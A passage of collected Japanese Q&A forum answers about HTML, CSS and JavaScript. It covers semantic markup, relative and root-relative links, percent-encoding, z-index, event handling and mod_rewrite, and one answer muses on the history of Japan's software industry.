td+td+td+td+td{border-color:yellow;} table[summary="periodic table"] td+td+td+td+td+td{border-color:orange;} table[summary="periodic table"] td+td+td+td+td+td+td{border-color:red;} table[summary="periodic table"] td+td+td+td+td+td+td+td{border-color:green;} div.section:after{ content:"";display:block;clear:left;/* float解除 */ } bodY{background-color:gray;} div.header,div.section,div.footer{background-color:silver;} /* aqua、black、blue、fuchsia、gray、green、lime、maroon、navy、olive、orange、purple、red、silver、teal、white、yellow */ --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<table summary="periodic table" border="1"> ＿＿＿<caption>周期表</caption> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<td>H</td><td></td><td></td><td></td><td></td><td></td><td></td><td>He</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>Li</td><td>Be</td><td>B</td><td>C</td><td>N</td><td>O</td><td>F</td><td>Ne</td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>Na</td><td>Mg</td><td>Al</td><td>Si</td><td>P</td><td>S</td><td>Cl</td><td>Kr</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<p> ＿＿＿周期表は、元素を、それぞれが持つ物理的または化学的性質が似たもの同士が並ぶように決められた規則（周期律）に従って配列した表である。左上から原子番号の順に並ぶよう作成されている。</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
accesskeyはキーボードのどのキーを押せばそこにフォーカスが当たるかというのを示す物ですから、 1文字（キーひとつ）だけ指定できます。
<hr>の色の付け方 http://www.mozilla.gr.jp/standards/webtips0003.h … http://www.html5.jp/tag/elements/hr.html <hr>を使っては行けないというわけではありません。 基本的にはセクション（章や節など）の区切りではなく段落の区切りに使う物です。 <section> <p>文章</p> <hr> <p>文章</p> </section> （この部分には<hr>を使う必要はない。（『使っては行けない』ではない）） <section> <p>文章</p> <hr> <p>文章</p> </section> 「テーマの区切りに線を引く事」と「章の区切りに線を引く」ことは、HTMLにおいては違うのですが、 概ね、「見出しを付けるほどではないが、話題が変わる部分」に<hr>を書けば良いと思います。 （見出しを付ける程の区切りには新しい<section>にして、<section>にボーダーライン（border）を引くことで、<hr>を書く必要がなくなる。） こういう言い方をする人がいるから、一覧表に<table>を使っては行けない、などと勘違いをする人が出てくると思うのですが。。。
ファイル名無しでアクセスした場合にどういう動作をするか・・・というのが設定されているだけです。 通常は index.html を返すように設定するのが多いです。 「長い」のは漢字などを含む日本語でファイル名やフォルダー名をつけた場合やスペースを含むURLとして本来使用してはいけない文字を使った場合にエンコードされた物です。 https://ja.wikipedia.org/wiki/%E3%83%81%E3%83%B3 … この場合、wiki/の後ろは「チンドン屋」という日本語になっています。 最近は少ないけど昔はプロバイダーに自分のホームページ作ると /~user/ みたいな チルダが先頭に来る事が多かったけど、これも本来はアウトなので%7eとされてしまいます。 通常は「URLエンコード」と呼ばれますが「パーセントエンコーディング」が正しいようです。 http://ja.wikipedia.org/wiki/%E3%83%91%E3%83%BC% … これも「パーセントエンコーディング」という文字列をパーセントエンコーディングした物となります。
html4.01までの仕様については、他者の説明を参考に！ ＨＴＭ5では、新たに<artcle>記事、<section>セクション、<header>,<nav>,<aside>：補足などの要素が追加されます。 class属性でないことに注意が必要！ よりよいものにするため、HTML5では、あいまいな<div>要素を使わないようにしようと、上記の要素が追加されました。 しかし、これらを利用しても完全に、文章構造と、デザインの分離ができないため、あえて<div>要素を使うことになります。 HTML5は現在策定中段階であり、勧告としての最終バージョン、HTML4.01・xhtml1.1が現行です。 使わない方がよいのではなく、使わざるおえないのが、現状です。 仕様勧告が出るころには、修正されているかも？？？
愚直に <head> <script>addEventListener('load',function(ev){ document.forms['jump'].elements['to'].addEventListener('change',function(ew){ var map = { yahoo: './akkotyan.html', houyhnhnms: 'http://google.com/search?tbm=isch&q=houyhnhnms' }; var url = map[ew.target.value]; if (url) window.location = url; },false); },false)</script> <body> <form name=jump><select name=to> <option value='' selected>-</option> <option value=yahoo>Yahoo</option> <option value=houyhnhnms>Houyhnhnms</option> </select></form>
>ある画面のHTMLについて質問です。 >HTML自体には、閉じるタグが漏れているとかそういったミスがないことを確認済。 どこで確認しましたか？・・・ mataの記述に間違いがあります。 から空間は、許されません！ <meta http-equiv="Content-Style-Type" content="text/css" /> <meta http-equiv="Content-Script-Type" content="text/javascript" /> <meta name="robots" content="noindex,nofollow" /> 参考URL：http://www.htmllint.net/html-lint/htmllint.cgi
私の環境では、以下の通りで動きましたよ。 －－－－－－－－－－－－－－－－－－－－ <script type="text/javascript" src="http://js.jugem.jp/prototype/1.6.0.3/prototype.j … <script type="text/javascript" src="http://js.jugem.jp/script.aculo.us/1.8.2/scripta … <script type="text/javascript" src="http://js.jugem.jp/Lightbox/2.04/js/lightbox.js" … <link rel="stylesheet" href="http://js.jugem.jp/Lightbox/2.04/css/lightbox.css" type="text/css" media="screen" /> <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8. … <script type="text/javascript"> jQuery.noConflict(); jQuery(document).ready(function($){ var bg1 = $('#main-img'); var speed = 3000; cloudMove(); setInterval(cloudMove, 6000); function cloudMove(){ bg1 .animate({backgroundPosition:'30px'}, speed) .animate({backgroundPosition:'0'}, speed); } }); </script> <style type="text/css"> #main-img{ height: 250px; background-image: url(サンプル画像.jpg); } </style> </head> <body> <!-- cloudMove --> <div id="main-img"></div> <!--lightbox --> <a href="(画像へのパス)" rel="lightbox" title="(画像タイトル)">画像表示</a> －－－－－－－－－－－－－－－－－－－－ たしかに、そのまんまでは競合していました。 //////////////////////////// <script type="text/javascript"> jQuery.noConflict(); jQuery(document).ready(function($){ //////////////////////////// として、上記のソースで動きました。 ご参考までに。 参考URL：http://semooh.jp/jquery/ref/cont/with_prototype/
ブラウザ丈けから簡単に出来る方は、私は何時も実行して居ますので御紹介致します。 1．http://style-easy.jp/archives/540 ← ブラウザから簡単に 2．http://style-easy.jp/archives/532 GoogleMapAPI、上級者用、まぁ手順は簡単の様ですが。 3．http://ascii.jp/elem/000/000/424/424032/ ↑2．のお手軽版 アナタが初心者でしたら先ずは、1．でスキルアップさせて措いて、次に 2．や 3．に挑戦して見ては如何でしょうか ? 1．と 2．の決定的な違いは、吹き出しに書き込める情報量、種類が圧倒的にフレキシブルなのが 2．だとゆう事です。 ※外に紹介情報が在れば追記します
＞参考書に説明がありません！？ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから OPTION要素の属性定義 　selected [CI] 　　この論理型属性が設定されていた場合、当該選択肢が選択済みであることを指定する。 　value = cdata [CS] 　　この属性は、当該コントロールの初期値を指定する。この属性が設定されていない場合、初期値はOPTION要素の内容となる。 　label = text [CS] 　　この属性により、著者は、当該項目に関してOPTION要素の内容そのものよりも短いラベルを指定できる。 これが設定されている場合、ユーザエージェントは当該項目のラベルとして、OPTION要素の内容ではなく本属性の値を用いる必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ひょっとして参考書とは仕様書じゃなかったかな？？ 　仕様書にすべて完璧に書かれているので、まずそれを調べてみましょう。 <option value="Y.J.">Yahoo!JAPAN</OPTION> 　とかフォームを受け取る側で処理しやすい文字列にしておくのが普通です。 input のradio,checkboxなどと同じです。
何らかのfremworkを利用していませんか？・・・ たとえば、JQueryMobileとか？？？ ＰＣでは動作するが、Ｍｏｂｉｌｅでは、うまくいかない場合、階層が深い場合によくあります。 JQueryMobilでは２階層までしか、うまくいかない！ どうするか？ target_blankを使い、別ウィンドウを開き動作させる。 階層を、２階層以上にしないことが基本では？・・・ <a href="#"title="" target="_blank">リンク先</a> このように記述した場合、同じ結果が出るようなら <a href="#"title="" target="_self">リンク先</a> これが原因です。
私は、(No.2の方が書かれている所の) サーバー相対URLを使用しています。 －－－－－－－－－－－－－－－－－－－－ <a href="/dir/demo.html">こちら</a> －－－－－－－－－－－－－－－－－－－－ 理由は、 このリンクを複数ページにコピーする必要が出てきた場合に、 <a href="/dir/demo.html">こちら</a> ↑どこのページにも貼れますが、 <a href="../../dir/demo.html">こちら</a> ↑ページからの相対リンクだと貼る箇所に合わせて修正する必要があります。 「サーバー相対URL」の場合、リンク先だけ正しければ リンク元との位置関係を意識する必要がありません。 また、http:から書かないのは、サイトがオープンするまでは、 仮ドメイン(http://test.honban./)などでサイト構築し、 本番(http://www.honban./)に切り替えるためです。 なので、<a href="/dir/demo.html">この形を採用しています。 余談ですが、どの形式で書いてもサイトの速度は変わりません。 結局は内部的に変換されてしまうので。 ご参考までに。
貴方が言ったソフト＋Ｅｐｕｂの知識が必要になります。 ＧｏｏｇｌｅなどからＥｐｕｂ作成ソフトが無料で配布されているので それを使って作成することになります。 本を買うならＥｐｕｂ作成辞典といった感じの物を買うといいでしょう。 Ｅｐｕｂ自体は割りと簡単にできますがインタラクティブな物は結構 敷居が高いです。ボクも自分で著作権の切れた本をＥｐｕｂにして端末 で読んでいますがインタラクティブな物を読むにはＰＣかＴａｂｌｅｔ が必要になります。
私はサイト内リンクはすべて/で書きます。 　ある程度の規模になるとこちらのほうが圧倒的に多いはずです。 [利点] 　すべてのリンクや参照が共通になる。 <link rel="stylesheet" type="text/css" media="screen" href="./styleSheet/standard.css"> <link rel="Alternate StyleSheet" type="text/css" media="screen,projection,tv" href="/styleSheet/default.css" title="汎用"> <link rel="styleSheet" type="text/css" media="print,handheld" href="./styleSheet/print.css"> <script src="/js/load.cgi"> <link rel="SHORTCUT ICON" href="/favicon.ico"> <link rel="ICON" href="/favicon.ico"> ・・・・・・ <a href="/">トップ</a> <img src="/images/photo.123.jpg"> ・・・・ など・・・・どの階層にいても、サーバーに対してルート(基点)からのパス指定ですから階層やフォルダーが変わっても書き直す必要がない。 スタイルシートも、 a[href="/"]{display:block;width:80px;height:40px;text-align:left;z-index:10em;overflow:hidden;backgroundimage:url();} ですべて共通化できる。 　制作上極めて楽になるのです。
　貴方が作成されているページでしたら、印刷用スタイルシートは指定すればよいかと・・ 例えば 　⇒imgタグのみで画像を中央に重ねる方法 - Webデザイン・CSS - 教えて！goo( http://oshiete.goo.ne.jp/qa/8503935.html ) 　だとどうでしょう。 　IEは昔から印刷は苦手ですので、印刷が得意なfirefoxなどを使われたら？？？ 　また、表示どおりに印刷するのでしたら、Page Saver( https://addons.mozilla.jp/firefox/details/10367 )で高解像度画像にして画像ソフトから印刷するとかも出来ます。
> 半角で打ったつもりが自動で大文字に変換されているようなんです。 Macは手元にないので的外れな回答になったら申し訳ないのですが、 以下のページの情報は参考になるでしょうか？ http://blog.livedoor.jp/mensstudio/smart-inyofu- …
No.2です。 ＞２の href="/"はどういう意味でしょうか？？？ 　サーバのルートからと言う意味です。 　　ブラウザは現在表示しているページは htt：プロトコル // インターネット abc.efg.com サーバー名/ドメイン hij/klm パス と知っています。もしそれがフォルダー名だとhij/klm/ 　../ とか ../../ だと階層を遡ってサーバーに　GET /　とか　GET /hijを要求します。 　/だったら、ルートすなわち、/として要求します。 　/で始まる指定方法は、例えばサイト内のどこからであっても常に共通になりますから、画像やスタイルシート、あるいはトップページへのリンクを書きなおす必要がありませんね。 　そのファイルが、/abc/efg.html だろうが、abc/hij/klm.html だろうが常に、/styleshheet/css.css 、/images/aaa.jpg /index.htmlを指し示すのですから、パスで悩む心配はありません。そのファイルの階層やフォルダーを移動しても共通です。 　ただし、ローカルにHTTPサーバーを持っていないと、ローカルでテストはできません。 　⇒12 リンク( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
　ちょっとハードルが高いかもしれませんが、方向性だけ ＞商品数が多いので、コピペではとても出来ません。 1) エクセルで構いませんので、CSVで保存するを選択する。 2) そのデータをPerlなどテキスト処理の得意な言語を使用して、 　CSV形式の行から値のリストを取り出す 　( http://www.din.or.jp/~ohzaki/perl.htm#CSV2Values ) 　のような手順で処理してHTMLを書き出すのが最も現実的かもしれません。 　掲示板システムなどで一般的に使用されている枯れた技術です。 3) また、2007以降のエクセルはファイルがXMLですから、XSLTを使用してHTMLを 直接作成することも可能です。 　いずれにしてもエクセルが出力するHTMLを経由しないほうが良いでしょう。
少なくともWindowsXPのTimes New Romanには「⇒」「・」は入っていませんでした。 これは「文字コード表」で調べられます。 アクセサリ→システムツールの中、あるいはファイル名を指定して実行から「charmap」で起動します。 フォントをTimes New Romanに合わせて検索する文字の名前に知りたい文字の名前を入れます。 「⇒」ならば「rightwards double arrow」です。分からなくても、明らかにその文字が入っているフォントで適当に「arrow」などで調べればわかります。 文字コードが分かれば「Unicodeで指定」の方が使いやすいでしょう。文字コードの調べ方は割愛します。 ただし、指定されていないフォントで表示できればそのフォントが使われますので、問題なく表示できます。
すみません、もう一カ所スペルミスを見逃していました。 script終了タグに / が入っていません。 × <script src="略"><script> ○ <script src="略"></script>
要素のスタイルに z-index だけでなく、position: relative も加えてください。 要素に z-index を適用する場合、その要素の position が static 以外の値でないといけません： つまり relative, absolute, fixed のどれかです。 position: relative を指定し top, right, bottom, left の値を指定しなければ（デフォルト値の auto にしておけば）、要素の位置はそのままに z-index で重なり順を制御できるはずです。 この手法で表示崩れを生じる場合は他のスタイルとの干渉が考えられます。 表示に関するアドバイス、余計なお世話かもしれませんが加えます。 『縦長になってバランスが悪いので』といった理由で JavaScript を用いたアコーディオン型メニューを加えているなら、それはきっとやめたほうがよいでしょう。 JavaScript がオフの環境は考慮されているかという問題以前に、バランスの悪くなるほど縦長のメニューは折り畳んだところで使い勝手は悪いままの場合がほとんどです。 なぜ縦長のメニューになるのでしょう。 カテゴリを細かく分類しすぎなのか。 それとも最下層のカテゴリまで一度に表示しようとしているのですか。 考慮の浅い分類は、表示の工夫以前にそもそも使いづらい運命です。 ぱっと見で収まるくらいの分類数に収めるよう考え直してみてはどうでしょう。 分類しづらい、あまりにかけ離れた商品種を扱っているなら、それは別のショップとしてサイトを作るべきです。 細かな分類は、大きな分類を選んだあとに表示するべきです。 数十の分類から一つを探し出すより、数個の分類を複数回渡り歩くほうがユーザーにストレスはかからないそうです（一回のクリックまでが短ければ、複数回クリックは苦にならない）。 細かな分類まで最初に見せたい理由が、その中に人気の商品があるなどであるなら、それは別枠の分類『人気の商品』『新商品』などとしてリンクを設けるべきで、わらの中から針を探すという苦行をユーザーにさせるべきではありません。 あとただの偏見ですが、マウスオーバーで出てくるサブメニューは使い勝手の悪い印象があるので、よほど洗練された使い方でない限りそれがあるだけでサイトの評価減です。 提供側の『このように見せたい』ではなく、利用側の『このように見たい』が優先される世界を願って。 （Amazon などは『このように見たい』の中にさりげなく彼らの売りたいものを混ぜてくるので、さすがだと思っています） 参考URL：http://webdesignrecipes.com/css-visual-formating …
<input type="button" value="住所" onclick="this.select(); clipboardData.setData('text','［住所］〒０００－００００\n○○県○○市○○町\n○－○－○\n［氏名］○○　○○○\n［ＴＥＬ］○○○－○○○－○○○○');"> <br> <input type="button" value="番号" onclick="this.select(); clipboardData.setData('text','1234567980');"> <br> <input type="button" value="落札された場合の定型文" onclick="this.select(); clipboardData.setData('text','お世話になります。\nこの度、商品を落札致しました。○○でございます。\n早速ですが、下記に詳細を記載しておりますのでご確認下さい。');"> IE限定ですけど、コピーできます。 ローカルでは（ブロックされているコンテンツを許可）が必要ですが。
META要素は、ページ内容のメタデータを記述するものです。 http://ja.wikipedia.org/wiki/メタデータ メタデータはページ内容の本質ではありません。 ですので、記述する必要はないオプション要素なのですが... 日本語環境では、文字化けを防ぐのに必須 by 歴史的経緯 http://www.html5.jp/trans/whatwg_html5faq.html#H … ググれなければ存在しないに等しい、との哲学をお持ちなら必須 by SEO https://support.google.com/webmasters/answer/798 … 特定ブラウザーに対して挙動を細かく指定したい場合 https://developer.apple.com/library/safari/docum … メタデータ以外の目的でMETA要素を使う場合もあります http://google.co.jp/search?q=html+meta+reflesh http://google.co.jp/search?q=html+meta+reload そのほかにも、Web編集ソフトの為に管理用データを埋め込む等の セキュリティ的に問題になるような用途にも使われる様ですが、 これは真似しないでください。
:hoverは、動的な擬似クラスですので、描画された後に始めて実態になるためstyle属性にはかけません。 　擬似クラス(::first-child)、リンクの擬似クラス(:link、:visited)、動的な擬似クラス(:hover、:active、focus)、および擬似要素(:before、:after) 　はそれによって要素を探すのですから・・・ なお、 ＞html内でclassで呼び出すと思うのですが、 　それは間違いです。class名は関係ありません。 ★スタイルシート--言い換えればプレゼンテーションのためにHTMLを書いてはなりません。!!スタイルシートを導入する最大の目的が「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」なのです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 文書の構造をプレゼンテーションと切り離すことで広汎なプラットフォームや多様なメディアでの文書提供コストを低下でき、文書の改訂も容易になるということが、経験的に知られている。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 下記添付の画像をHTMLと同じ場所にtemplate.jpgとして保存する。 ★タブは＿に置換してあるので戻す。 ★HTML4.01strict+CSS2.1文字コードはShift_JIS ★デザインのためのclass名は書いてない。class名やidは文書構造を示すための物です。 ★使いまわしのソースで申し訳ない。 　/* ここからリンクの画像を変更 */以降が方法(スプライトと言う技法) <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} div.section{position:relative;} div.section div.nav,div.section div.aside{position:absolute;top:0;width:150px;height:100%;padding:0 5px;font-size:0.9em;} div.section div.nav{left:0;} div.section div.aside{right:0;} div.section div.section{width:auto;min-width:0;margin:0 160px;min-height:300px;} div.section h2,div.section p{margin:0 160px;} div.section div p{margin:0;} /* 色分け */ body{background-color:gray;} div.header{background-color:aqua;} div.section{background-color:white;} div.section div.section{background-color:transparent;} div.section div.aside{background-color:lime;} div.section div.nav{background-color:silver;} div.footer{background-color:fuchsia;} /* ここからリンクの画像を変更 */ div.section div.nav ol{list-style:none;} div.section div.nav ol li{width:100px;height:80px;position:relative;} div.section div.nav ol li a{ display:block; width:100%;height:100%; text-indent:-200px;oveflow:hidden; background-image:url(./template.jpg); } a[href="#section1"]{background-position:-24px -16px;} a[href="#section2"]{background-position:-157px -16px;} a[href="#section3"]{background-position:-294px -16px;} a[href="#section1"]:hover{background-position:-24px -118px;} a[href="#section2"]:hover{background-position:-157px -118px;} a[href="#section3"]:hover{background-position:-294px -118px;} a[href="#section1"]:active{background-position:-24px -217px;} a[href="#section2"]:active{background-position:-157px -217px;} a[href="#section3"]:active{background-position:-294px -217px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<div class="section" id="section1"> ＿＿＿<h3>項見出し</h3> ＿＿＿<p>本文項記事</p> ＿＿＿<p>sectionの階層でレベルが判断される</p> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<h3>項見出し</h3> ＿＿＿<p>本文項記事</p> ＿＿＿<p>sectionの階層でレベルが判断される</p> ＿＿</div> ＿＿<div class="section" id="section3"> ＿＿＿<h3>項見出し</h3> ＿＿＿<p>本文項記事</p> ＿＿＿<p>sectionの階層でレベルが判断される</p> ＿＿</div> ＿＿<div class="nav"> ＿＿＿<h3>目次</h3> ＿＿＿<ol> ＿＿＿＿<li><a href="#section1">１項</a></li> ＿＿＿＿<li><a href="#section2">２項</a></li> ＿＿＿＿<li><a href="#section3">３項</a></li> ＿＿＿</ol> ＿＿</div> ＿＿<div class="aside"> ＿＿＿<h3>補足記事</h3> ＿＿＿<p>ここには、本題から外れた(aside)、本題とは直接関係しない記事を書く</p> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
質問になっていませんが・・・ 戻るボタンなどで戻った時にチェックがついたままにしたいということでしょうか？ それともまた同じページに訪問した時にチェックがついたままにしたい？ 前者はブラウザの仕様の問題なので、完璧にできる方法はありません 場合によってはjavascriptを利用してクッキーという仕組みを利用すれば 一時的にデータを保持することができます 後者の場合は、サーバー側のプログラムでやる必要があります 一つはセッションという仕組みをつかう、もうひとつはデータベースに保持して 再度アクセスしたときに表示する・・・などが一般的です
addEventListener と stopPropagation を使いましょう https://developer.mozilla.org/ja/docs/Web/API/ev … 例: addEventListener('load', function(ev){ _ function listener(clickEvent) { _ _ clickEvent.stopPropagation(); // 上位要素への伝播を止める _ _ clickEvent.preventDefault(); // ブラウザのデフォルト挙動(ページ遷移)を防ぐ _ _ 処理(clickEvent.currentTarget); _ } _ document.getElementById(対象のリンクID).addEventListener('click', listener, false); }, false); 古いIEを考慮しなければならない特別な事情があるなら cancelBubble を併用してください http://msdn.microsoft.com/ja-jp/library/cc409795 … 例: function text_func(){ _ window.event.cancelBubble = true; // 上位要素への伝播を止める _ 処理(); }
自分はaspxの知識は無いのですが、HTMLの場合だと、以下の様にするとうまく行くと思います。aspxだとうまく行かないかもしれません。 HTMLとaspxでは全然違うかも知れませんので、的外れな回答をしてたらすみません。 ■ フォルダとファイルの構成 HTML\aa\bbb.aspx HTML\cc\ddd.html ■ 「bbb.aspx」の内容 <html> <head></head> <body> <form id="form1" name="form1" method="post" action="aaa.aspx"> <input type="text" name="name" size="40"> </form> <div style='height: 1000px;'></div> <table> <tr> <th class="m"> <a name="test">ここに飛んで！</a> </th> </tr> </table> <div style='height: 1000px;'></div> </body> </html> ■ 「ddd.html」の内容 <html> <head></head> <body> <a href="../aa/bbb.aspx#test">test</a> </body> </html>
No.6のものです。 30年前というと、コンピュータにとっては黎明期です。当時はマイコンとかミニコンなど コンピュータの処理能力で名前をつけていました。 本当に日本と言う国がチップの製造に踏み切ったのは、電話交換機の機械化が発端です。 ですので、最も古い国産の32ビットCPUは、今のNTTが開発を依頼しました。 これを受けてOSやアセンブラ、コンパイラなど今では一般の人も馴染んでいる高度な 制御技術も日本独自の自作をしていたのです。 ここではHDからIO制御装置、あらゆる装置やソフトを自作していたようです。 もちろんこれらは大手電機メーカーが請け負っています。 いまコンピュータ系で有名な古参電機メーカーは、この技術を使って自社製品を作り、 それが今日の日本の産業に成っています。 ですので、通信とコンピュータだけは総務省が主導しています。 電話交換機を主体とした通信キャリアのソフトウェアやハードウェアの発注規模は全体で 3兆円近くになっていました。 これはIT系のソフトウェア発注総額に近く、お金の出所が全てここになります。 ここから大手電機メーカーが受注し、子会社に再発注をし、最後は学生がアルバイトで仕事 をするというヒエラルキーが出来ていました。 いまでもこの流れは強く、 一見してプログラムは自由に思えても、 お金を稼ぐ場合は、クライアントのクライアント、そのクライアントの好みが影響します。 プログラムコードをかけても、食べていけない人が多いのは、この経緯を知らないからです。 時代が少し進歩し、日本ではゲーム業界が立ち上がります。 ここには自由を求めてコードを書く多くのプロがラマーが集まり、別のグループが出来ます。 今現在では、パチンコ業界に流れているようです。 いずれにしても、大人数で仕事をする以上、これを纏め上げるボスの力量が大事。 ソフトウェア技術よりも、顧客志向であることと、計画性と論理性を武器にもつ人が上に立ちます。 いま多様な言語が出ておりますが、 これらの発祥に関して、さきほどあげた出身業界があります。 通信業界のトップやそこと共闘した大手電機メーカーのトップの好みは、 当時の花形であるIBMであり、マイクロソフトがIBMを裏切ったことで未だに良く思っていません。 対抗するための措置として、SunマイクロシステムのハードウェアやOSを良く購入していました。 最近では、Javaを開発したSunを擁護し、Javaをi-modeに採用したりしています。 時代の趨勢が変わっても、こうした妄執がいまだに残っているのと、 海外でのマイクロソフト独占阻止の流れと合流し、LinuxとJava系の技術者を擁護していたのです。 これは経済が活況であれば問題ないのですが、 そうでないならば、囚われずコストと生産性で評価すべきですね。 ところが長らくそうしてきたため、年下の層の技術が偏ってしまい、転進ができないのです。 いまではこのままじゃ駄目だと思いつつも、自分たちにとって良くわからないので採用できない。 そうした状態にあるようです。 そこへきてSNSなどIT長者の台頭、Google、I-Phoneなどが独自も武器で世界を席巻し、 日本のソフトウェア産業（通信キャリアから電機メーカーへお金が流れる）のベースロードが枯渇 しはじめたのです。 こうなると、技術は古いわ、お金は無いわで、手も足も出ません。 過去の創始者たちの影響力が弱まり、一般ユーザが好む美しいものが大事にされるようになりました。 マイクロソフト社のビル・ゲイツ氏は、こうした美しいものやコンピュータ操作の快感が大事と 考えており、日本のゲーム業界の思想とかなり近かったそうです。 もちろんアップル社が際立っていましたが。 上記の話は、この業界でまともに仕事をしていれば常識として誰もが知っている話です。 ところが、さきほど述べたように海外の自由な思想が日本にも浸透し、 別の経緯で参入を試みる若いエネルギーが育ってきたのだと思います。 Silverlightが嫌がられるかも、とわたしが気にしたのは、 商売ですから、どこで古い思想のクライアントやもしくはその子分に出会うかわかりませんよ。 そうした場合も想定し、 日本の技術者は、全てにおいて万全に技術を磨いています。 しかし、質問者さんの最初のはなし。 「とんでもなく綺麗。美しい」 と言う感覚が弱く、高い技術力を持っていても、外見でショボイものを作ってしまいます。 勿論、高い技術力を持つ部下は可愛いので、悪く言わないのですが、 「さすがに商売っ気出してくれよ・・・」 と、経営者が諭しています。 ですが、 「技術は必要ないっていうんですか？」 と言う問答になってしまい、馬鹿馬鹿しいですが、変な対立関係が生じています。 ですので、変に技術自慢をしたりすると、昔以上に飯が食えません。 また、海外のビジネスモデルは、クリエイターの囲い込みを行って、 それらのドライバー製品（サーバーやミドルウェア）を高値で企業に売ることです。 非常に簡単な話、 自分がただでソフト開発環境を手に入れても、 納品先の企業は高額のミドルウェアライセンスを支払わないと使用できないかもしれません。 こうした気遣いをしないと、プロではないですね。 Linux系は無料のドライバーで対抗している組織も多く顧客受けしています。 しかし、ソフト開発本来の楽しみを得るには、マイクロソフト社や日本のゲーム業界のほうが クリエーターよりです。 そのためJavaは企業向け、C＃は一般のご家庭向け、Cは組み込み系でシェアを伸ばしています。 Flashはアドビがあまり大きい勢力ではないので、その他として扱われ、 いつの間にか普及していたという感じです。 Web技術者を目指すならば、まずはWeb系の言語にふれ、全てをやってみるといいでしょう。 以上、ご参考になれば。
以下の 3 行”のみ”記述して試してください。 ----- RewriteEngine on RewriteCond %{REQUEST_URI} ^(.*/)index\.html$ RewriteRule ^ %1 [noescape,redirect=permanent,last] ----- これで動かなければ、他のディレクティブとの干渉が考えられます。 そこから先はご自身で調査するほかありません。
ctx.drawImage(img, 100, 100, 200, 200); を img.onload = function() { ctx.drawImage(img, 100, 100, 200, 200); }; としてみたらどうなりますか?
> F=document.getElementsByTagName('form')[0]; 関数 sendmail の引数 F と被っているので不要 > F.elements[0] この記述方法は今後を考えると危険です F.elements['Q1'].value // ユニークな名前の場合 F.elements['Q2'][0].value // 同一名で複数ある場合 とするのが良いでしょう > Q2aのチェック状況 function getChecked(o) { return o.checked? o.value: '' } var Q2aのチェック状況 = getChecked(F.elements['Q2'][0]);
それは不可能です。 frameがなくなった理由のひとつがそれなのです。 普通にひとつのHTMLにすればよいだけです。 1999年12月の勧告で 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』framesetやtransitinalは非推奨になって15年・・・。 　⇒フレーム 問題 html - Google 検索( https://www.google.co.jp/search?q=%E3%83%95%E3%8 … )
javascriptで「見えていない要素をクリックやマウスオーバーで見えるようにする。」ということです。 写真だけでよければ「Lightbox」という既製品が一番簡単。 http://news.mynavi.jp/articles/2007/06/14/lightb … 手作りなら、こんな感じで。 <script language="JavaScript"> function VIS(name){ document.all(name).style.visibility="visible"; document.layers[name].visibility="visible"; } function HID(name){ document.all(name).style.visibility="hidden"; document.layers[name].visibility="hidden"; } </Script> <body> 画像にマウスを当てると別の要素が現れます。 <hr> <center> <a href="javascript:void(0)" onMouseover="VIS('L1')" onMouseout="HID('L1')"><img src="redcube.gif" border=0 align=middle></a> <span id="L1" style="position:relative;visibility:hidden"> これは赤い正方形です。 </span><br> <a href="javascript:void(0)" onMouseover="VIS('L2')" onMouseout="HID('L2')"><img src="bluecube.gif" border=0 align=middle></a> <span id="L2" style="position:relative;visibility:hidden"> これは青い正方形です。 </span> </body>
こんにちは。 実際のところどのような現象が起きているかわからないのでなんともいえません。 http://furoshiki.hatenadiary.jp/entry/ie_documen … このあたりも参考にしてみて、設定を試してみてください。
